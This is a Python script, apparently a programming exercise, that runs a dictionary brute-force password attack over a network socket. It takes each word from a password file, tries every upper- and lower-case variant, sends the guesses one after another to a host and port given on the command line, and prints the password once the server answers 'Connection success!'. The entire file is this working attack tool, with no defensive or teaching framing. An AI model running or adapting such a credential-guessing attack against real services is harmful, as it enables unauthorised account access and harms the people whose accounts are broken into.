import itertools
import string
import socket
import sys

letters = list(string.ascii_lowercase)
numbers_int = list(range(10))
numbers = [str(num) for num in numbers_int]
characters = list(itertools.chain(letters, numbers))


#Generates password from all possible variations from a password dictionary. Use absolute path for the passwords if necessary
def pass_dic():
    with open('passwords.txt', 'r') as file:
        pass_read = file.readlines()
        pass_read = (item.strip() for item in pass_read)
        yield pass_read



def pass_mixer():
    key = next(pass_dic())

    for _ in range(1000):
        password = list(dict.fromkeys((itertools.chain(map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in next(key))))))))
        for j in password:
            yield j

with socket.socket() as client_socket:
    args = sys.argv
    hostname = args[1]
    port = int(args[2])
    address = (hostname, port)
    client_socket.connect(address)
    pass_guess = pass_mixer()
    for _ in range(100_000):
        pword = next(pass_guess)
        client_socket.send(pword.encode())
        response = client_socket.recv(1024).decode()
        if response == 'Connection success!':
            print(pword)
            break